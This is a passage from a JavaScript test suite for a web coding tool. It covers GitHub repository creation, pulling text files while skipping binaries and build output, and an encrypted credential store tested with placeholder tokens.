    const body = JSON.parse(calls.find((c) => c.method === 'POST' && c.url.endsWith('/user/repos')).body);
    assert.equal(body.auto_init, true);
    assert.ok(calls.some((c) => c.method === 'PATCH' && c.url.includes('/git/refs/')));
  });

  test('without autoInit, creates a root commit and the branch ref', async () => {
    const calls = installFetch([
      { match: '/user/repos', reply: created() },
      { match: '/git/blobs', reply: json({ sha: 'b' }) },
      { match: '/git/trees', method: 'POST', reply: json({ sha: 'tn', tree: [] }) },
      { match: '/git/commits', method: 'POST', reply: json({ sha: 'root', html_url: '' }) },
      { match: '/git/refs', method: 'POST', reply: json({ ref: 'refs/heads/main', object: { sha: 'root' } }) },
    ]);

    const result = await createRepository({
      token, name: 'newrepo', private: true, autoInit: false,
      files: [{ path: 'index.html', content: 'x' }], commitMessage: 'Initial',
    });

    assert.equal(result.commit.commitSha, 'root');

    const treeBody = JSON.parse(calls.find((c) => c.method === 'POST' && c.url.endsWith('/git/trees')).body);
    assert.ok(!('base_tree' in treeBody), 'a root tree has no base');

    const commitBody = JSON.parse(calls.find((c) => c.method === 'POST' && c.url.endsWith('/git/commits')).body);
    assert.deepEqual(commitBody.parents, [], 'a root commit has no parents');

    const refCall = calls.find((c) => c.method === 'POST' && c.url.endsWith('/git/refs'));
    assert.equal(JSON.parse(refCall.body).ref, 'refs/heads/main');

    assert.equal(JSON.parse(calls.find((c) => c.url.endsWith('/user/repos')).body).auto_init, false);
  });
});

/* ═══ GitHub: pull ══════════════════════════════════════════════════════════ */

describe('pullFiles', () => {
  test('returns text files, skips binaries and build output', async () => {
    installFetch([
      { match: '/git/ref/heads/main', reply: json({ object: { sha: 'h' } }) },
      { match: '/git/commits/h', reply: json({ sha: 'h', tree: { sha: 'tb' }, html_url: '' }) },
      { match: '/git/trees/tb', reply: json({ sha: 'tb', tree: [
        { path: 'index.html', type: 'blob', sha: 's1', size: 10 },
        { path: 'src/app.js', type: 'blob', sha: 's2', size: 10 },
        { path: 'assets/logo.png', type: 'blob', sha: 's3', size: 2048 },
        { path: 'node_modules/x/index.js', type: 'blob', sha: 's4', size: 10 },
        { path: 'dist/bundle.js', type: 'blob', sha: 's5', size: 10 },
        { path: 'big.js', type: 'blob', sha: 's6', size: 10 * 1024 * 1024 },
      ] }) },
      { match: '/git/blobs/s1', reply: json({ content: btoa('<h1>hi</h1>'), encoding: 'base64' }) },
      { match: '/git/blobs/s2', reply: json({ content: btoa('console.log(1)'), encoding: 'base64' }) },
    ]);

    const result = await pullFiles({ token, ref: { owner: 'o', repo: 'r' }, branch: 'main' });
    const paths = result.files.map((f) => f.path).sort();

    assert.deepEqual(paths, ['index.html', 'src/app.js']);
    assert.equal(result.files.find((f) => f.path === 'index.html').content, '<h1>hi</h1>');
  });

  test('normalises CRLF so Windows files do not show as fully changed', async () => {
    installFetch([
      { match: '/git/ref/heads/main', reply: json({ object: { sha: 'h' } }) },
      { match: '/git/commits/h', reply: json({ sha: 'h', tree: { sha: 'tb' }, html_url: '' }) },
      { match: '/git/trees/tb', reply: json({ sha: 'tb', tree: [{ path: 'a.txt', type: 'blob', sha: 's1', size: 4 }] }) },
      { match: '/git/blobs/s1', reply: json({ content: btoa('a\r\nb'), encoding: 'base64' }) },
    ]);
    const result = await pullFiles({ token, ref: { owner: 'o', repo: 'r' }, branch: 'main' });
    assert.equal(result.files[0].content, 'a\nb');
  });
});

/* ═══ Credential store ═════════════════════════════════════════════════════ */

describe('credentialStore', () => {
  test('round-trips a token when remembered', async () => {
    const value = 'ghp_' + 'A'.repeat(36);
    const record = await saveCredential('t1', value, true);
    assert.equal(record.sessionOnly, false);
    assert.equal(await readCredential('t1'), value);
  });

  test('a remembered token is not readable as plaintext in storage', async () => {
    await saveCredential('t2', 'ghp_SECRET_TOKEN_VALUE_1234567890', true);
    const raw = globalThis.window.localStorage.getItem('gbcoder_cred_v1:t2');
    assert.ok(raw, 'expected an envelope');
    assert.ok(!raw.includes('ghp_SECRET'), 'must not store the token in the clear');
    assert.ok(JSON.parse(raw).iv && JSON.parse(raw).data);
  });

  test('forget removes it everywhere', async () => {
    await saveCredential('t3', 'secret', true);
    forgetCredential('t3');
    assert.equal(await readCredential('t3'), null);
    assert.equal(globalThis.window.localStorage.getItem('gbcoder_cred_v1:t3'), null);
    assert.equal(describeCredential('t3'), null);
  });

  test('two ids do not collide', async () => {
    await saveCredential('vercel', 'v', true);
    await saveCredential('netlify', 'n', true);
    assert.equal(await readCredential('vercel'), 'v');
    assert.equal(await readCredential('netlify'), 'n');
  });

  test('overwriting a remembered token with a session-only one removes the disk copy', async () => {
    await saveCredential('t4', 'first', true);
    await saveCredential('t4', 'second', false);
    assert.equal(globalThis.window.localStorage.getItem('gbcoder_cred_v1:t4'), null,
      'must not leave the remembered copy behind');
    assert.equal(await readCredential('t4'), 'second');
  });
});

/* ── helpers ─────────────────────────────────────────────────────────────── */

/** git blob sha, for asserting the local diff matches what a remote tree reports. */
function shaOf(content) {
  const bytes = Buffer.from(content, 'utf8');
  const header = Buffer.from(`blob ${bytes.length}\0`, 'utf8');
  return createHash('sha1').update(Buffer.concat([header, bytes])).digest('hex');
}
